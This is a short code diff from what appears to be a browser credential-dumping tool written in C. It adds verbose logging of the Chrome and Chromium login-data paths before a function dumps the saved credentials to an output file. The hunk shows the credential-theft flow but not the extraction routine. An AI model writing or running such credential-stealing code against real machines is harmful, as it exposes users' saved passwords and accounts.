@@ -146,14 +146,17 @@ int dump_chrome(const char *output_file) {
 
 	load_chrome_paths(chrome_path, chrome_login_data_path, chromium_path, chromium_login_data_path);
 
+
 	// TODO: S_OK / F_OK ?
 	if(access(chrome_login_data_path,0) != -1) {
+        log_verbose("Chrome path : %s", chrome_login_data_path);
 		log_info("Starting Chrome credentials dump...\n");
 		result = get_chrome_creds(chrome_login_data_path, output_file);
 	}
 
 	// TODO: S_OK / F_OK ?
 	if(access(chromium_login_data_path, 0) != -1) {
+        log_verbose("Chromium path : %s", chromium_login_data_path);
 		log_info("Starting Chromium credentials dump...\n");
 		result = get_chrome_creds(chromium_login_data_path, output_file);
 	} 
